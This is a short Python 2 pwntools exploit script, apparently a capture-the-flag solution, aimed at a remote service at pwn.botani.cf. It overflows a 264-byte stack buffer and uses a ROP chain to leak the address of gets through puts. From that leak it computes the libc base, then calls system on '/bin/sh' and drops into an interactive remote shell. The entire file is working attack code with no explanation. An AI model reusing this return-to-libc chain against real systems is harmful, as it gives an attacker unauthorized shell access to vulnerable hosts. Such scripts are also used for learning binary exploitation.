from pwn import *;
import telnetlib
from struct import *

r = remote('pwn.botani.cf',3238)
#r = remote('127.0.0.1',3238)

buff = ''
buff+= "A"*264
buff+= p64(0x4007f3) #pop rdi, ret
buff+= p64(0x601018) #gets@got
buff+= p64(0x400500) #puts@plt
buff+= p64(0x40064d) #main

print r.recv()
r.sendline(buff)
d = r.recv()[65:72].strip().ljust(8, '\x00')
print d

#addr_puts = unpack("Q", d)[0]
addr_puts  = u64(d[:8])
print addr_puts

print "addr_puts ", hex(addr_puts)

offset_puts  = 0x6fe30 

libc_base = addr_puts - offset_puts
print "libc_base", hex(libc_base)

system_addr = libc_base + 0x46640 
bin_sh_addr = libc_base + 0x17ccdb


print "system_addr", hex(system_addr), p64(system_addr)
print "bin_sh_addr", hex(bin_sh_addr), p64(bin_sh_addr)



buff = ''
buff+= "B"*264
buff+= p64(0x4007f3) #pop rdi, ret
buff+= p64(bin_sh_addr) #bin_sh
buff+= p64(system_addr) #system
buff+= p64(0x03c290) #exit

r.clean()
#print r.recv()
r.sendline(buff)
print r.recv()

# get a shell
r.interactive()

# get a shell
#t = telnetlib.Telnet()
#t.sock = r
#t.interact()
